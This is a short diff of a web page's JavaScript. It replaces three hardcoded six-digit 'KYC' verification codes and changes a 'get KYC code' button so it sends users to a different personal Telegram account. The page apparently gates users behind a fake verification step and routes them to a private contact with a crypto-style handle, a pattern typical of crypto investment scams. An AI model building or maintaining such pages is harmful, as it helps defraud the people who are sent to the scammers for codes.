@@ -5,9 +5,9 @@ const error_box = document.querySelector('.error');
 const get_kyc_btn = document.querySelector('b');
 const btn = document.getElementById('btn');
 
-const kyc1 = ['3','3','6','6','5','7'];
-const kyc2 = ['1','1','4','9','1','2'];
-const kyc3 = ['6','6','3','9','2','1'];
+const kyc1 = ['8','8','9','6','5','7'];
+const kyc2 = ['0','5','4','9','1','2'];
+const kyc3 = ['7','0','3','9','2','1'];
 
 var u_input = [];
 var tryal_counter=0;
@@ -47,7 +47,7 @@ inputs.forEach((input, index) => {
 });
 
 get_kyc_btn.addEventListener('click', () => {
-    location.assign("https://t.me/AGATHA_CASTROBTC2");
+    location.assign("https://t.me/Rebeccafernandez0");
     // location.assign("{{url('/user/account')}}");
 });
 
